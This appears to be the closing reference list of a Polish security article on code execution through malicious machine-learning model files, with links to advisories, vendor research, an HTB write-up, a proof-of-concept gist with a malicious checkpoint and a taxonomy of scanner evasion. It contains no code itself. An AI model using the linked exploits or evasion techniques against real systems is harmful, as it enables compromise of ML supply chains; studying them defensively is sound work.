- [9] [PoC ze złośliwym checkpointem (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader po poprawce (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – zdalne wykonanie kodu z użyciem nowoczesnych formatów i bibliotek AI/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Dokumentacja Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Commit z listą blokowanych elementów w Hydra (ostrzeżenie o RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – od SQLi do RCE: wykorzystanie checkpointera LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Wykorzystanie błędów Archive Slip w zgłoszeniach bug bounty o wysokiej wartości w obszarze AI/ML](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Advisory Snyk i proof of concept PyFunc – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [Kod źródłowy MLflow – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [MLflow REST API – endpointy pobierania i wysyłania artefaktów](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
- [21] [Taksonomia unikania wykrycia przez skaner statyczny Binarly MLTracer](https://raw.githubusercontent.com/binarly-io/ai-supply-chain-attacks-research/master/MLTracer/evasion.md)
- [22] [Binarly – wykrywanie złośliwych modeli za pomocą MLTracer](https://binarly.io/blog/malicious-model-detection-mltracer)
- [23] [Implementacja PyTorch storage `_load_from_bytes`](https://raw.githubusercontent.com/pytorch/pytorch/main/torch/storage.py)
- [24] [Mapowanie zgodności `find_class` w pickle CPython](https://raw.githubusercontent.com/python/cpython/main/Lib/pickle.py)
- [25] [Mapowanie importów `_compat_pickle` w CPython](https://raw.githubusercontent.com/python/cpython/main/Lib/_compat_pickle.py)
